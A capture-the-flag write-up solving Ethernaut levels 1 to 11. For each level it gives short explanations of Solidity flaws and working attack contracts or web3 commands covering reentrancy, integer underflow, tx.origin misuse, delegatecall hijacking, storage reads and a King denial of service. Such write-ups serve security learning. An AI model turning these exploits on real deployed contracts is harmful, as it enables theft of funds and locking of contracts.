# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between contract functions and fallback function.
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.
``` 
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint;
    
    address public targetContract;
    
    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }
    
    function attackFlipWithContract() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(targetContract).flip(side);
    }
    
    function attackFlipWithout() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
        (bool success, ) = targetContract.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 4. Telephone
When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
```
pragma solidity ^0.6.0;
contract AttackTelephone {
    address public telephone;
    
    constructor(address _telephone) public {
        telephone = _telephone;
    }
    
    function changeBadOwner(address badOwner) public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
        (bool success, ) = telephone.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 5. Token
No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
```
await contract.transfer(instance, 25)
```

## 6. Delegation
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await contract.sendTransaction({
    data: payload
});
```

## 7. Force
You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).x
```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

## 9. King
This is a classic example of DDoS with unexpected revert when part of the logic in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter howm uch ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        _victim.call.gas(1000000).value(1 ether)("");
    }
    
    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy
The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again.
Note that the number of times the fallback function runs is based on the amt of gas submitted when you call `maliciousWithdraw()`. 

Also, not sure why calling function via address.call() doesn't work for withdraw but it works for donating...
```
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract AttackReentrancy {
    address payable victim;
    
    constructor(address payable _victim) public payable {
        victim = _victim;
        
        // Call Donate
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        victim.call.value(msg.value)(payload);
    }
    
    function maliciousWithdraw() public payable {
        // Call withdraw
        Reentrance(victim).withdraw(0.5 ether);
    }
    
    fallback() external payable {
        maliciousWithdraw();
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
```

## 11. Elevator
Actually this one surprised me a little. I knew how to make top true but I didn't know what the problem is until I read further. Apparently, the older version of the solidity compiler does not ensure that view, constant or pure functions modify state. For example, as of 0.4.25, the compiler only prompts an error if your view function modifies state. However, when I tried it with 0.4.17, no prompt is triggered.

https://solidity.readthedocs.io/en/develop/contracts.html#view-functions
https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d
```
pragma solidity ^0.4.18;

import "./Elevator.sol";

contract SingleFloor is Building {
    bool private iCheated = false;
    Elevator private _target;
    
    constructor(address target) public { 
        _target = Elevator(target);
    }
    
    function goLastFloor(uint floor) public {
        _target.goTo(floor);
    }
    
    function isLastFloor(uint) view public returns (bool) {
        if(!iCheated) {
            iCheated = true;
            return false;
        }
        return true;
    }
}


```





